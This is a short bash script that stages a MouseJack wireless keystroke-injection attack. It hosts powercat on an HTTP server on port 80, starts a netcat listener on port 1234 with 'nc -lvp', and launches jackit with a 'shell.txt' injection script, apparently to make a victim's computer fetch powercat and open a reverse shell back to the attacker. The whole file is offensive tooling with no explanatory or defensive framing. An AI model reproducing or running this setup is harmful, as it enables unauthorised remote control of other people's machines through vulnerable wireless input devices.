#!/bin/bash

GRN='\033[0;32m'
NC='\033[0m'

cd
cd MouseJack/
cd powercat/
printf "${GRN}Starting HTTP Server on port:80...\n${NC}"
gnome-terminal -e "python -m SimpleHTTPServer 80"
printf "${GRN}Starting netcat listener on port:1234...\n${NC}"
gnome-terminal -e "nc -lvp 1234"
cd
gnome-terminal -e "jackit --script MouseJack/jackit/shell.txt --reset"

